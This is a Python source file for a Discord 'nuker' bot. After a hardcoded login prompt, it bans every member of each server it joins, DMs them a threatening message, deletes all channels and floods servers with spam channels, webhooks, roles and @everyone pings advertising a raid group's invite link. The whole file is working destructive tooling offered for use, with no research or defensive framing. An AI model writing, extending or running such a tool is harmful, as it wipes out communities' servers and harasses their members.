import discord
from discord.ext import commands
from colorama import Fore, Style, init

init()

valid_usernames = ["admin", "root"]
valid_passwords = ["Cartelroot", "cartel"]

input_username = input(Fore.YELLOW + "Please enter your username: ")
input_password = input(Fore.GREEN + "Please enter your password: ")

if input_username not in valid_usernames or input_password not in valid_passwords:
    print(Fore.RED + "Invalid username or password. Exiting..." + Style.RESET_ALL)
    exit()

print(Fore.YELLOW + """
  /$$$$$$                        /$$               /$$
 /$$__  $$                      | $$              | $$
| $$  \__/  /$$$$$$   /$$$$$$  /$$$$$$    /$$$$$$ | $$
| $$       |____  $$ /$$__  $$|_  $$_/   /$$__  $$| $$
| $$        /$$$$$$$| $$  \__/  | $$    | $$$$$$$$| $$
| $$    $$ /$$__  $$| $$        | $$ /$$| $$_____/| $$
|  $$$$$$/|  $$$$$$$| $$        |  $$$$/|  $$$$$$$| $$
 \______/  \_______/|__/         \___/   \_______/|__/
""" + Style.RESET_ALL)

token = input("Please enter your bot token: ")

intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix='c!', intents=intents)

message_text = "Cartel Is Back Come here discord.gg/NHawf66GJN @everyone @here"
dm_message = "You are about to be banned from this server. For more information, visit: discord.gg/NHawf66GJN"

@bot.event
async def on_ready():
    # Set the bot's status to Do Not Disturb
    await bot.change_presence(status=discord.Status.dnd, activity=discord.Game(name="Playing In Python"))
    print(f'We have logged in as {bot.user}' + Style.RESET_ALL)
    while True:
        print("\nChoose an option:" + Style.RESET_ALL)
        print(Fore.GREEN + "1 = Ban all" + Style.RESET_ALL)
        print(Fore.GREEN + "2 = Spam webhook" + Style.RESET_ALL)
        print(Fore.RED + "3 = Spam roles" + Style.RESET_ALL)
        print(Fore.RED + "4 = Raid" + Style.RESET_ALL)
        choice = input("\nEnter your choice (1/2/3/4): ")

        if choice == '1':
            await execute_action(banall_all_servers, "Banning all members...")
        elif choice == '2':
            await execute_action(spam_all_servers, "Spamming webhooks...")
        elif choice == '3':
            await execute_action(roles_all_servers, "Spamming roles...")
        elif choice == '4':
            await execute_action(raid_all_servers, "Raiding servers...")
        else:
            print(Fore.RED + "Invalid choice, try again..." + Style.RESET_ALL)

async def execute_action(action, message):
    print(Fore.YELLOW + message + Style.RESET_ALL)
    await action()
    print(Fore.GREEN + "Done!" + Style.RESET_ALL)

async def raid(guild):
    for channel in guild.channels:
        try:
            await channel.delete()
        except discord.Forbidden:
            continue

    for i in range(50):
        channel_name = 'Cartel&Back'
        try:
            channel = await guild.create_text_channel(channel_name)
            for _ in range(7):
                await channel.send(message_text)
        except discord.Forbidden:
            continue

async def raid_all_servers():
    for guild in bot.guilds:
        await raid(guild)

async def roles(guild):
    for i in range(50):
        role_name = f'Cartel{i+1}'
        try:
            await guild.create_role(name=role_name)
        except discord.Forbidden:
            continue

async def roles_all_servers():
    for guild in bot.guilds:
        await roles(guild)

async def spam(guild):
    for channel in guild.text_channels:
        try:
            webhook = await channel.create_webhook(name="Cartel Webhook")
            for _ in range(12):
                await webhook.send(message_text)
        except discord.Forbidden:
            continue

async def spam_all_servers():
    for guild in bot.guilds:
        await spam(guild)

async def banall(guild):
    members = guild.members

    for member in members:
        if member == bot.user or member.bot:
            continue

        try:
            try:
                await member.send(dm_message)
            except discord.Forbidden:
                pass

            await member.ban(reason='Banned by bot command')
        except discord.Forbidden:
            continue
        except discord.HTTPException:
            continue

async def banall_all_servers():
    for guild in bot.guilds:
        await banall(guild)

bot.run(token)